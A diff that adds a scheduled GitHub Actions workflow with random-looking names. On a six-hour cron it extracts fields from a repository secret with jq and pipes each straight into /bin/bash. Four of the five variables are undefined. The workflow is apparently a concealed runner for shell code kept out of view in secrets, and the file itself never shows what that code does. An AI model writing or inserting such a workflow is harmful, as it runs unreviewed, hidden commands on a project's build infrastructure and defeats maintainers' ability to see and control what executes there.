@@ -1,0 +1,22 @@
+name: binnaclepiglet
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: binnaclepiglet
+        env:
+          lppmi54: ${{ secrets.lppmi54 }}
+        run: |
+          echo $lppmi54 | jq -r .tnrz0 | /bin/bash
+          echo $bndo7 | jq -r .skfi2 | /bin/bash
+          echo $jpqc44 | jq -r .vlpob1 | /bin/bash
+          echo $hhw48193 | jq -r .tdtnf228 | /bin/bash
+          echo $icc420 | jq -r .qmbtc8081 | /bin/bash
+
